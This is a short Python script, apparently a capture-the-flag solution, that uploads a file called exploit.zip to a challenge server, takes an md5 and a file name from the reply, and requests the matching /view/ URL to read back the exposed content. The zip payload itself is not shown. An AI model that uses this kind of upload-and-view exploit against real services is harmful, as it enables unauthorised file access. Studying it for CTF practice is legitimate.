import requests

def send_exploit():
    url = 'http://challenge.xinshi.fun:48853/upload'
    
    # 读取zip文件
    with open('exploit.zip', 'rb') as f:
        files = {'file': ('exploit.zip', f, 'application/zip')}
        
        # 发送POST请求
        response = requests.post(url, files=files)
        print("Upload response:", response.text)
        
        # 从响应中提取md5和文件名
        try:
            if "文件列表" in response.text:
                info = response.text.split("访问: /view/")[1]
                md5, filename = info.split("/")
                filename = filename.strip()
                
                # 构造view URL
                view_url = f'http://challenge.xinshi.fun:48853/view/{md5}/{filename}'
                print(f"\nTrying to view file at: {view_url}")
                
                # 获取文件内容
                view_response = requests.get(view_url)
                print("\nView response:", view_response.text)
            else:
                print("Upload failed or unexpected response format")
        except Exception as e:
            print(f"Error processing response: {e}")

if __name__ == '__main__':
    send_exploit()
